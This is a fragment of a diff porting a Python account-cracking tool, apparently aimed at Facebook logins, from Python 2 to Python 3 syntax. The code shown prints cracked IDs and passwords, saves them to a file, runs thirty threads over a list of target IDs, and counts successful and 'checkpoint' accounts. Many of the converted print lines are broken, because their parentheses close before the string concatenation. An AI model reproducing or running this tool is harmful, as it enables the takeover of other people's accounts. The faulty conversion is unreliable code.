-				                                                                                                   print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                                                                   print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
+				                                                                                                   print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				                                                                                                   print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				                                                                                                   print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				                                                                                                   print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass9 + '\n'
 				                                                                                                   cek = open("out/super_cp.txt", "a")
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
@@ -592,11 +592,11 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 #Dev:FIROZ_AHMED
-        print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»"
-	print '\033[1;94m[Process Has Been Completed]'
-	print"\033[1;94mTotal\033[1;92mOK/\x1b[1;91mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
-	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»"
-	print """
+        print( "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»")
+	print( '\033[1;94m[Process Has Been Completed]')
+	print("\033[1;94mTotal\033[1;92mOK/\x1b[1;91mCP \033[1;91m: \033[1;92m")+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
+	print( "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»")
+	print( """)
              
           ^^         |         ^^
           ::         |         ::
@@ -618,7 +618,7 @@ def pilih_super():
              ::             ::
              ^^             ^^
 
-print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»"
+print( "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»")
 	
 \033[1;94m██████╗░██╗░░░██╗███████╗
 \033[1;94m██╔══██╗╚██╗░██╔╝██╔════╝
@@ -627,7 +627,7 @@ print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»
 \033[1;94m██████╦╝░░░██║░░░███████╗
 \033[1;94m╚═════╝░░░░╚═╝░░░╚══════╝
 """
-	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»"
+	print( "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»")
 	raw_input("\n\033[1;97m[\033[1;95mBack\033[1;97m]")
 	menu()
 
